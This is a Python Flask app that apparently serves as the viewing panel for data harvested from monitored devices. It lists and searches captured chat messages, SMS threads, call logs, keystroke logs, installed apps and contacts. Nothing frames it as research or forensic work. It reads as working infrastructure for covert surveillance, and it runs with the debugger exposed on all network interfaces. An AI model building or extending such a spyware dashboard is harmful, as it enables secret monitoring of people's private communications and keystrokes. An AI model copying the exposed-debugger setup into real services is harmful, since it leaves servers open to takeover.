from flask import Flask, render_template, send_from_directory, request, jsonify
import os
import psycopg2
from psycopg2.extras import DictCursor
import logging

# Set up logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__, template_folder='templates', static_folder='static')

# Database connection
def get_db_connection():
    try:
        conn = psycopg2.connect(os.getenv('DATABASE_URL'))
        conn.cursor_factory = DictCursor
        return conn
    except Exception as e:
        logger.error(f"Database connection error: {e}")
        return None

# Serve static files
@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory('static', filename)

# Main menu route
@app.route('/')
def index():
    try:
        conn = get_db_connection()
        if conn:
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT DISTINCT sender AS name FROM ChatMessages 
                    UNION 
                    SELECT DISTINCT from_to AS name FROM SMS
                    ORDER BY name
                """)
                contacts = cur.fetchall()
            conn.close()
        else:
            contacts = []
            logger.warning("Could not connect to database")
        
        return render_template('main_menu.html', contacts=contacts, active_section='chats')
    except Exception as e:
        logger.error(f"Error in index route: {e}")
        return render_template('main_menu.html', contacts=[], active_section='chats')

@app.route('/chat/<name>')
def chat(name):
    try:
        conn = get_db_connection()
        if conn:
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT * FROM ChatMessages 
                    WHERE sender = %s 
                    ORDER BY time
                """, (name,))
                messages = cur.fetchall()
            conn.close()
        else:
            messages = []
        return render_template('chat.html', name=name, messages=messages)
    except Exception as e:
        logger.error(f"Error in chat route: {e}")
        return render_template('chat.html', name=name, messages=[])

@app.route('/sms/<name>')
def sms_thread(name):
    try:
        conn = get_db_connection()
        if conn:
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT * FROM SMS 
                    WHERE from_to = %s 
                    ORDER BY time
                """, (name,))
                sms_messages = cur.fetchall()
            conn.close()
        else:
            sms_messages = []
        return render_template('sms.html', name=name, sms_messages=sms_messages)
    except Exception as e:
        logger.error(f"Error in SMS route: {e}")
        return render_template('sms.html', name=name, sms_messages=[])

@app.route('/calls')
def calls():
    try:
        conn = get_db_connection()
        if conn:
            with conn.cursor() as cur:
                cur.execute('SELECT * FROM Calls ORDER BY time DESC')
                call_logs = cur.fetchall()
            conn.close()
            return render_template('calls.html', call_logs=call_logs)
        return render_template('calls.html', call_logs=[])
    except Exception as e:
        logger.error(f"Error in calls route: {e}")
        return render_template('calls.html', call_logs=[])

@app.route('/keylogs')
def keylogs():
    try:
        conn = get_db_connection()
        if conn:
            with conn.cursor() as cur:
                cur.execute('SELECT * FROM Keylogs ORDER BY time DESC')
                keylogs = cur.fetchall()
            conn.close()
            return render_template('keylogs.html', keylogs=keylogs)
        return render_template('keylogs.html', keylogs=[])
    except Exception as e:
        logger.error(f"Error in keylogs route: {e}")
        return render_template('keylogs.html', keylogs=[])

@app.route('/installed_apps')
def installed_apps():
    try:
        conn = get_db_connection()
        if conn:
            with conn.cursor() as cur:
                cur.execute('SELECT * FROM InstalledApps ORDER BY install_date DESC')
                apps = cur.fetchall()
            conn.close()
            return render_template('installed_apps.html', installed_apps=apps)
        return render_template('installed_apps.html', installed_apps=[])
    except Exception as e:
        logger.error(f"Error in installed_apps route: {e}")
        return render_template('installed_apps.html', installed_apps=[])

@app.route('/contacts')
def contacts_list():
    try:
        conn = get_db_connection()
        if conn:
            with conn.cursor() as cur:
                cur.execute('SELECT * FROM Contacts ORDER BY name')
                contacts = cur.fetchall()
            conn.close()
            return render_template('contacts.html', contacts=contacts)
        return render_template('contacts.html', contacts=[])
    except Exception as e:
        logger.error(f"Error in contacts route: {e}")
        return render_template('contacts.html', contacts=[])

@app.route('/search', methods=['POST'])
def search():
    search_term = request.form.get('search_term')
    if not search_term:
        return jsonify({'error': 'Search term is required.'}), 400

    try:
        conn = get_db_connection()
        if not conn:
            return jsonify({'error': 'Could not connect to database'}), 500

        results = []
        with conn.cursor() as cur:
            # Search chat messages
            cur.execute("""
                SELECT sender, text, time 
                FROM ChatMessages 
                WHERE text ILIKE %s 
                ORDER BY time
            """, (f'%{search_term}%',))
            chat_results = cur.fetchall()

            # Search SMS messages
            cur.execute("""
                SELECT from_to, text, time 
                FROM SMS 
                WHERE text ILIKE %s 
                ORDER BY time
            """, (f'%{search_term}%',))
            sms_results = cur.fetchall()

        conn.close()

        for result in chat_results:
            results.append({
                'type': 'chat',
                'name': result['sender'],
                'text': result['text'],
                'time': result['time'].strftime('%Y-%m-%d %H:%M:%S')
            })
        for result in sms_results:
            results.append({
                'type': 'sms',
                'name': result['from_to'],
                'text': result['text'],
                'time': result['time'].strftime('%Y-%m-%d %H:%M:%S')
            })

        return jsonify(results)
    except Exception as e:
        logger.error(f"Error in search route: {e}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
